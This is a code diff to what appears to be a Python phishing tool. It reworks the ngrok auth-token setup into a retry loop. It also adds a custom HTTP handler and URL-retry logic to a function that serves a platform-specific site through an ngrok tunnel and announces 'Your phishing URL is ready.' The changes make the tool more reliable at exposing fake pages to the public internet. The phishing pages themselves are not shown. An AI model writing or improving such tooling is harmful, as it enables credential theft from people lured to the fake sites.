@@ -74,8 +74,6 @@ def setup_ngrok_auth():
                     if verify_ngrok_api():
                         print("✓ Using saved auth token")
                         return True
-                    else:
-                        print("× Saved auth token is not working")
                 finally:
                     if test_process:
                         test_process.terminate()
@@ -84,80 +82,94 @@ def setup_ngrok_auth():
                             os.system('taskkill /f /im ngrok.exe 2>nul')
                         else:
                             os.system('pkill ngrok')
-            else:
-                print("× Saved auth token is invalid")
         except Exception as e:
             print(f"× Error with saved token: {str(e)}")
     
-    # If we get here, we need a new token
+    # If we get here, either no token exists or the token didn't work
+    print("\n× No valid auth token found")
     print("\nPlease get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
     print("Options:")
     print("[1] Enter new auth token")
     print("[2] Create new ngrok account")
+    print("[3] Exit")
     
-    choice = input("Enter your choice: ").strip()
-    
-    if choice == '1':
-        token = input("Enter your ngrok auth token: ").strip()
-        if token:
-            try:
-                result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
-                                     capture_output=True, text=True)
-                if result.returncode == 0:
-                    # Verify the new token works
-                    test_process = None
-                    try:
-                        # Kill any existing ngrok processes
-                        if os.name == 'nt':
-                            os.system('taskkill /f /im ngrok.exe 2>nul')
-                        else:
-                            os.system('pkill ngrok')
-                        
-                        time.sleep(1)
-                        
-                        # Start test tunnel
-                        if os.name == 'nt':
-                            test_process = subprocess.Popen(f"ngrok http 9999", shell=True, 
-                                                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                        else:
-                            test_process = subprocess.Popen(['ngrok', 'http', '9999'], 
-                                                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                        
-                        if verify_ngrok_api():
-                            print("✓ Auth token configured successfully")
-                            save_auth_token(token)  # Save the working token
-                            return True
-                        else:
-                            print("× Auth token verification failed")
-                            return False
-                    finally:
-                        if test_process:
-                            test_process.terminate()
-                            time.sleep(1)
+    while True:
+        choice = input("\nEnter your choice: ").strip()
+        
+        if choice == '1':
+            token = input("Enter your ngrok auth token: ").strip()
+            if token:
+                try:
+                    result = subprocess.run(['ngrok', 'config', 'add-authtoken', token], 
+                                         capture_output=True, text=True)
+                    if result.returncode == 0:
+                        # Verify the new token works
+                        test_process = None
+                        try:
+                            # Kill any existing ngrok processes
                             if os.name == 'nt':
                                 os.system('taskkill /f /im ngrok.exe 2>nul')
                             else:
                                 os.system('pkill ngrok')
-                else:
-                    print(f"× Error configuring auth token: {result.stderr}")
-                    return False
-            except Exception as e:
-                print(f"× Error configuring auth token: {str(e)}")
-                return False
-        else:
-            print("× No token provided")
+                            
+                            time.sleep(1)
+                            
+                            # Start test tunnel
+                            if os.name == 'nt':
+                                test_process = subprocess.Popen(f"ngrok http 9999", shell=True, 
+                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            else:
+                                test_process = subprocess.Popen(['ngrok', 'http', '9999'], 
+                                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            
+                            if verify_ngrok_api():
+                                print("✓ Auth token configured successfully")
+                                save_auth_token(token)  # Save the working token
+                                return True
+                            else:
+                                print("× Auth token verification failed")
+                        finally:
+                            if test_process:
+                                test_process.terminate()
+                                time.sleep(1)
+                                if os.name == 'nt':
+                                    os.system('taskkill /f /im ngrok.exe 2>nul')
+                                else:
+                                    os.system('pkill ngrok')
+                    else:
+                        print(f"× Error configuring auth token: {result.stderr}")
+                except Exception as e:
+                    print(f"× Error configuring auth token: {str(e)}")
+            else:
+                print("× No token provided")
+        elif choice == '2':
+            print("\nPlease follow these steps:")
+            print("1. Go to https://ngrok.com")
+            print("2. Click 'Sign up'")
+            print("3. Create a new account")
+            print("4. Get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
+            input("\nPress Enter when you have your new auth token...")
+            continue  # Go back to token input
+        elif choice == '3':
             return False
-    elif choice == '2':
-        print("\nPlease follow these steps:")
-        print("1. Go to https://ngrok.com")
-        print("2. Click 'Sign up'")
-        print("3. Create a new account")
-        print("4. Get your auth token from: https://dashboard.ngrok.com/get-started/your-authtoken")
-        input("\nPress Enter when you have your new auth token...")
-        return setup_ngrok_auth()  # Recursively call to handle the new token
-    else:
-        print("Invalid choice!")
-        return False
+        else:
+            print("Invalid choice!")
+            continue
+            
+        # If we get here and no return happened, the token didn't work
+        print("\nWould you like to:")
+        print("[1] Try entering token again")
+        print("[2] Create new account")
+        print("[3] Exit")
+        retry = input("\nEnter your choice: ").strip()
+        if retry == '1':
+            continue
+        elif retry == '2':
+            continue
+        else:
+            return False
+    
+    return False
 
 def generate_ngrok(platform):
     # Check and install ngrok if needed
@@ -206,7 +218,23 @@ def serve_website(platform):
     try:
         # Start a simple HTTP server in the background
         PORT = random.randint(8000,9000)  # Random port to avoid conflicts
+        
+        class CustomHandler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory=directory, **kwargs)
+            
+            def log_message(self, format, *args):
+                # Suppress log messages
+                pass
+                
+            def do_GET(self):
+                # Serve index.html for root path
+                if self.path == '/':
+                    self.path = '/index.html'
+                return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        
         max_retries = 3
+        httpd = None
         
         for retry in range(max_retries):
             try:
@@ -221,7 +249,11 @@ def serve_website(platform):
                     print("× Failed to find an available port after multiple attempts")
                     return None
         
-        # Start the server in a separate process
+        if not httpd:
+            print("× Failed to start local server")
+            return None
+            
+        # Start the server in a separate thread
         server_thread = threading.Thread(target=httpd.serve_forever)
         server_thread.daemon = True
         server_thread.start()
@@ -240,46 +272,59 @@ def serve_website(platform):
         else:  # Linux/Mac
             subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        time.sleep(2)  # Give ngrok time to start
+        # Wait for ngrok to start and get URL with retries
+        max_url_retries = 5
+        url = None
         
-        # Get the public URL from ngrok API
-        try:
-            response = requests.get("http://localhost:4040/api/tunnels")
-            tunnels = response.json()['tunnels']
-            if tunnels:
-                url = tunnels[0]['public_url']
-                if not url.startswith('https'):
-                    url = url.replace('http', 'https')
-                print("\n" + "=" * 60)
-                print(colored("Your phishing URL is ready:", 'yellow'))
-                print(colored(url, 'green', attrs=['bold']))
-                print(colored("Press Ctrl+C to stop", 'red'))
-                print("=" * 60 + "\n")
-                
-                # Keep running until Ctrl+C
-                try:
-                    while True:
-                        time.sleep(1)
-                except KeyboardInterrupt:
-                    print("\n\nStopping server...")
+        for i in range(max_url_retries):
+            try:
+                time.sleep(2)  # Wait between attempts
+                response = requests.get("http://localhost:4040/api/tunnels")
+                tunnels = response.json()['tunnels']
+                if tunnels:
+                    url = tunnels[0]['public_url']
+                    if not url.startswith('https'):
+                        url = url.replace('http', 'https')
+                    break
+            except Exception as e:
+                if i < max_url_retries - 1:
+                    print("Waiting for ngrok tunnel...")
+                    continue
+                else:
+                    print(f"× Error getting ngrok URL: {str(e)}")
                     httpd.shutdown()
                     httpd.server_close()
-                    if os.name == 'nt':
-                        os.system('taskkill /f /im ngrok.exe 2>nul')
-                    else:
-                        os.system('pkill ngrok')
-                    os.chdir(current_dir)  # Return to original directory
+                    os.chdir(current_dir)
                     return None
-                    
-            else:
-                print("× Error: No ngrok tunnels found")
+        
+        if url:
+            print("\n" + "=" * 60)
+            print(colored("Your phishing URL is ready:", 'yellow'))
+            print(colored(url, 'green', attrs=['bold']))
+            print(colored("Press Ctrl+C to stop", 'red'))
+            print("=" * 60 + "\n")
+            
+            # Keep running until Ctrl+C
+            try:
+                while True:
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                print("\n\nStopping server...")
                 httpd.shutdown()
                 httpd.server_close()
-                os.chdir(current_dir)
+                if os.name == 'nt':
+                    os.system('taskkill /f /im ngrok.exe 2>nul')
+                else:
+                    os.system('pkill ngrok')
+                os.chdir(current_dir)  # Return to original directory
                 return None
-                
-        except Exception as e:
-            print(f"× Error getting ngrok URL: {str(e)}")
+        else:
+            print("× Error: Could not get ngrok URL after multiple attempts")
+            print("\nTroubleshooting steps:")
+            print("1. Check your internet connection")
+            print("2. Make sure no other ngrok instances are running")
+            print("3. Try running with sudo: sudo python3 main.py")
+            print("4. Verify your auth token is correct")
             httpd.shutdown()
             httpd.server_close()
             os.chdir(current_dir)
@@ -292,6 +337,9 @@ def serve_website(platform):
         print("2. Check your internet connection")
         print("3. Make sure no other ngrok instances are running")
         print("4. Try running with sudo: sudo python3 main.py")
+        if 'httpd' in locals() and httpd:
+            httpd.shutdown()
+            httpd.server_close()
         os.chdir(current_dir)
         return None
 
